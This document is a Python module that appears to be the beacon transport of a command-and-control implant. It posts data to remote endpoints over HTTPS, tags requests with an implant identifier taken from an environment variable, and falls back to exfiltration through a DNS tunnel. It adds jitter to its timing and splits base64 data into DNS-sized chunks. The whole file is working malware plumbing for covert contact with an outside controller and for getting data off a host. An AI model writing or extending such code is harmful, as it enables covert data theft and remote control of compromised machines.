"""Client-side beacon transport. HTTPS primary, DNS fallback."""
import os
import random
import time

import requests

from . import dns_tunnel


class Transport:
    def __init__(self, endpoints: list[str], jitter: float = 0.35, sleep: int = 60):
        self.endpoints, self.jitter, self.sleep = endpoints, jitter, sleep

    def _delay(self) -> None:
        time.sleep(self.sleep * (1 + random.uniform(-self.jitter, self.jitter)))

    def send(self, blob: dict, kind: str = "beacon") -> dict:
        errors = []
        for url in self.endpoints:
            try:
                if url.startswith("dns://"):
                    return dns_tunnel.exfil(url[6:], blob)
                r = requests.post(f"{url}/api/beacon/{kind}", json=blob, timeout=30,
                                  headers={"X-Dna": os.environ.get("PEGASUS_DNA", "")})
                r.raise_for_status()
                return {"via": "https", "status": r.status_code, "body": r.json()}
            except requests.RequestException as exc:
                errors.append(f"{url}: {exc}")
            self._delay()
        return {"via": "none", "errors": errors}


def chunk(data: bytes, size: int = 180) -> list[str]:
    import base64
    b64 = base64.urlsafe_b64encode(data).decode()
    return [b64[i:i + size] for i in range(0, len(b64), size)]
